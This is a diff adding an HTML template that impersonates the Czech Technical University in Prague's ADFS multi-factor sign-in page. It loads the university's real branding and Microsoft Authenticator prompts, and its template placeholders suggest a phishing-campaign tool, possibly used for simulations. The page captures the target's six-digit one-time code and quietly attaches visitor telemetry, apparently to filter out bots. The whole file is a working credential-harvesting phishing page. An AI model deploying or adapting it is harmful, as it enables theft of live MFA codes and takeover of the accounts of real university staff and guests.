@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="cs" dir="ltr">
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<meta http-equiv="cache-control" content="no-cache,no-store">
+<title>Sign In</title>
+<link rel="stylesheet" type="text/css" href="https://logon.ms.cvut.cz/adfs/portal/css/style.css?id=EE218E4277FD9DEFDBE57E2176A7BF08CE9DDFAC040CBFAEF517299EADFD8A3A">
+<style>
+.illustrationClass{background-image:url(https://logon.ms.cvut.cz/adfs/portal/illustration/illustration.jpg?id=A968E85944E24FCDC94A5BED87C2CFA6AB4F36A328D588C30B0427DF9F13DC43)}
+
+/* ── MFA view switching ───────────────────────────────────────────────────── */
+.mfa-view          { display: none; }
+.mfa-view.active   { display: block; }
+
+/* ── Identity banner (← email) ───────────────────────────────────────────── */
+.mfa-banner {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 13px;
+    color: #1b1b1b;
+    margin-bottom: 20px;
+    cursor: pointer;
+    width: fit-content;
+}
+.mfa-banner:hover .mfa-banner-email { text-decoration: underline; }
+.mfa-banner-email  { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+/* ── Method picker rows ───────────────────────────────────────────────────── */
+.mfa-methods       { border-bottom: 1px solid #e8e8e8; margin-bottom: 16px; }
+.mfa-method {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 13px 0;
+    border-top: 1px solid #e8e8e8;
+    cursor: pointer;
+    text-decoration: none;
+    color: #1b1b1b;
+}
+.mfa-method:hover .mfa-method-label { text-decoration: underline; color: #0067b8; }
+.mfa-method-icon {
+    width: 36px; height: 36px;
+    background: #f3f2f1;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+}
+.mfa-method-label  { font-size: 13px; line-height: 1.4; }
+
+/* ── Number matching box ──────────────────────────────────────────────────── */
+.mfa-number-box {
+    border: 1px solid #d2d0ce;
+    border-radius: 2px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    margin-bottom: 16px;
+}
+.mfa-number {
+    font-size: 40px;
+    font-weight: 600;
+    color: #1b1b1b;
+    letter-spacing: 2px;
+    line-height: 1;
+}
+
+/* ── OTP code entry ───────────────────────────────────────────────────────── */
+.mfa-proof-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    margin-bottom: 16px;
+}
+.mfa-proof-desc { font-size: 13px; color: #1b1b1b; line-height: 1.5; padding-top: 4px; }
+
+/* ── Shared small elements ────────────────────────────────────────────────── */
+.mfa-hint    { font-size: 13px; color: #444; line-height: 1.5; margin-bottom: 14px; }
+.mfa-link    { display: block; font-size: 13px; color: #0067b8; text-decoration: none; cursor: pointer; margin-bottom: 8px; }
+.mfa-link:hover { text-decoration: underline; }
+.mfa-check   { font-size: 13px; color: #444; line-height: 1.5; margin-bottom: 16px; }
+.mfa-check a { color: #0067b8; }
+.mfa-error   { display: none; color: #a80000; font-size: 12px; margin-top: 4px; }
+</style>
+</head>
+<body dir="ltr" class="body">
+<div id="fullPage">
+    <div id="brandingWrapper" class="float">
+        <div id="branding" class="illustrationClass"></div>
+    </div>
+    <div id="contentWrapper" class="float">
+        <div id="content">
+            <div id="header">
+                <img class="logoImage" id="companyLogo"
+                    src="https://logon.ms.cvut.cz/adfs/portal/logo/logo.png?id=503E816D90FA118F2C975A443C886E6EAB3B93D2D9912631F5BA9B750ED9EB9D"
+                    alt="CTU in Prague">
+            </div>
+            <main>
+                <div id="workArea">
+                    <div id="authArea" class="groupMargin">
+                        <div id="loginArea">
+
+                            <!-- ── State 0: Verify your identity ─────────── -->
+                            <div id="mfa0" class="mfa-view active">
+                                <div id="loginMessage" class="groupMargin">Verify your identity</div>
+
+                                <div class="mfa-methods">
+                                    <a class="mfa-method" id="pickPush" href="#" tabindex="0">
+                                        <div class="mfa-method-icon">
+                                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                                <rect x="5" y="9" width="10" height="8" rx="1" fill="#605e5c"/>
+                                                <path d="M7 9V7a3 3 0 0 1 6 0v2" stroke="#605e5c" stroke-width="1.5" fill="none" stroke-linejoin="round"/>
+                                                <circle cx="10" cy="13" r="1.2" fill="#fff"/>
+                                            </svg>
+                                        </div>
+                                        <span class="mfa-method-label">Approve a request on my Microsoft Authenticator app</span>
+                                    </a>
+                                    <a class="mfa-method" id="pickCode" href="#" tabindex="0">
+                                        <div class="mfa-method-icon">
+                                            <svg width="22" height="16" viewBox="0 0 22 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                                <rect x="1" y="1" width="20" height="14" rx="2" stroke="#605e5c" stroke-width="1.5"/>
+                                                <text x="4" y="11" font-size="8.5" font-family="Segoe UI,Arial,sans-serif" fill="#605e5c" font-weight="700">123</text>
+                                            </svg>
+                                        </div>
+                                        <span class="mfa-method-label">Use a verification code</span>
+                                    </a>
+                                </div>
+
+                                <p class="mfa-check">Are your verification methods current? Check at
+                                    <a href="https://aka.ms/mfasetup" target="_blank" rel="noopener">https://aka.ms/mfasetup</a></p>
+                            </div>
+
+                            <!-- ── State 1: Approve sign in request ───────── -->
+                            <div id="mfa1" class="mfa-view">
+                                <div class="mfa-banner" id="backFromPush" tabindex="0" role="button">
+                                    <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M7 1.5L1.5 6.5L7 11.5" stroke="#1b1b1b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                    </svg>
+                                    <span class="mfa-banner-email">{{ ct.target.email }}</span>
+                                </div>
+                                <div id="loginMessage" class="groupMargin">Approve sign in request</div>
+
+                                <p class="mfa-hint">Open your Authenticator app and approve the request. Enter the number if prompted.</p>
+
+                                <div class="mfa-number-box">
+                                    <div class="mfa-number">{{ approval_number }}</div>
+                                </div>
+
+                                <p class="mfa-hint">Didn&rsquo;t receive a sign-in request?
+                                    <strong>Swipe down to refresh</strong> the content in your app.</p>
+
+                                <a class="mfa-link" id="switchToOTP" tabindex="0">I can&rsquo;t use my Microsoft Authenticator app right now</a>
+                                <a class="mfa-link" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" target="_blank" rel="noopener">More information</a>
+                            </div>
+
+                            <!-- ── State 2: Enter code (OTP) ──────────────── -->
+                            <div id="mfa2" class="mfa-view">
+                                <div class="mfa-banner" id="backFromOTP" tabindex="0" role="button">
+                                    <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M7 1.5L1.5 6.5L7 11.5" stroke="#1b1b1b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                    </svg>
+                                    <span class="mfa-banner-email">{{ ct.target.email }}</span>
+                                </div>
+                                <div id="loginMessage" class="groupMargin">Enter code</div>
+
+                                <div class="mfa-proof-row">
+                                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_b41922ebdaebec16b19999fc6054a15a.svg"
+                                         width="32" height="32" alt="" role="presentation">
+                                    <p class="mfa-proof-desc">Enter the code displayed in the Microsoft Authenticator app on your mobile device</p>
+                                </div>
+
+                                <form method="post" id="mfaForm" autocomplete="off" novalidate
+                                      action="/t/{{ name }}/{{ token }}/mfa/">
+                                    <div class="fieldMargin">
+                                        <label for="codeInput" class="hidden">Code</label>
+                                        <input id="codeInput" name="mfa_code" type="tel"
+                                               class="text fullWidth" placeholder="Code"
+                                               maxlength="6" inputmode="numeric"
+                                               autocomplete="one-time-code" aria-required="true">
+                                        <div id="errorMsg" class="mfa-error" role="alert">Enter the 6-digit code from your authenticator app.</div>
+                                    </div>
+
+                                    <a class="mfa-link" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" target="_blank" rel="noopener" style="margin-bottom:16px">More information</a>
+
+                                    <div class="submitMargin">
+                                        <input type="submit" class="submit" tabindex="1" value="Verify">
+                                    </div>
+                                </form>
+                            </div>
+
+                        </div>
+                    </div>
+                    <div id="introduction" class="groupMargin">
+                        <p><strong>Notice:</strong> As of <strong>April 15, 2026</strong>, the use of
+                        <strong>multi-factor authentication (MFA)</strong> will be enabled on all
+                        guest-type accounts in the Office 365 environment. This change applies to all
+                        external accounts that are not part of the CTU IS and were invited to the
+                        Office 365 environment based on an email address. Further information is available at
+                        <a href="https://ist.cvut.cz/en/our-services/office-365-guest-accounts/" target="_blank" rel="noopener">Office 365 Guest Accounts</a>
+                        and <a href="https://ist.cvut.cz/en/our-services/multi-factor-authentication-mfa/" target="_blank" rel="noopener">Multi-factor authentication (MFA)</a>.</p>
+                    </div>
+                </div>
+            </main>
+            <div id="footerPlaceholder"></div>
+        </div>
+        <footer id="footer">
+            <div id="footerLinks" class="floatReverse">
+                <div>
+                    <span id="copyright">&copy; 2018 Microsoft</span>
+                    <a id="home" class="pageLink footerLink" href="#">Computing and Information Centre</a>
+                    <a id="helpDesk" class="pageLink footerLink" href="#">ServiceDesk</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+</div>
+<script type="text/javascript">
+var _t0=Date.now(),_sc=0,_fc=0;
+window.addEventListener('scroll',function(){_sc=1;},{passive:true,once:true});
+document.addEventListener('focusin',function(e){if(e.target&&e.target.tagName==='INPUT')_fc++;});
+
+function mfaShow(id){
+    ['mfa0','mfa1','mfa2'].forEach(function(v){
+        document.getElementById(v).classList.remove('active');
+    });
+    document.getElementById(id).classList.add('active');
+}
+
+document.getElementById('pickPush').addEventListener('click',function(e){ e.preventDefault(); mfaShow('mfa1'); });
+document.getElementById('pickCode').addEventListener('click',function(e){
+    e.preventDefault(); mfaShow('mfa2'); document.getElementById('codeInput').focus();
+});
+document.getElementById('switchToOTP').addEventListener('click',function(){
+    mfaShow('mfa2'); document.getElementById('codeInput').focus();
+});
+function goBack(){ mfaShow('mfa0'); }
+document.getElementById('backFromPush').addEventListener('click', goBack);
+document.getElementById('backFromOTP').addEventListener('click', goBack);
+['backFromPush','backFromOTP'].forEach(function(id){
+    document.getElementById(id).addEventListener('keydown',function(e){
+        if(e.key==='Enter'||e.key===' '){ e.preventDefault(); goBack(); }
+    });
+});
+
+var form=document.getElementById('mfaForm');
+form.addEventListener('submit',function(e){
+    var inp=document.getElementById('codeInput');
+    if(inp.value.replace(/\D/g,'').length<6){
+        e.preventDefault();
+        document.getElementById('errorMsg').style.display='block';
+        inp.focus();
+        return;
+    }
+    function add(n,v){var i=document.createElement('input');i.type='hidden';i.name=n;i.value=v;form.appendChild(i);}
+    add('_t_time',Math.round((Date.now()-_t0)/1000));
+    add('_t_scroll',_sc);
+    add('_t_focus',_fc);
+    add('_t_screen',screen.width+'x'+screen.height);
+});
+document.getElementById('codeInput').addEventListener('input',function(){
+    this.value=this.value.replace(/\D/g,'');
+    document.getElementById('errorMsg').style.display='none';
+});
+</script>
+</body>
+</html>
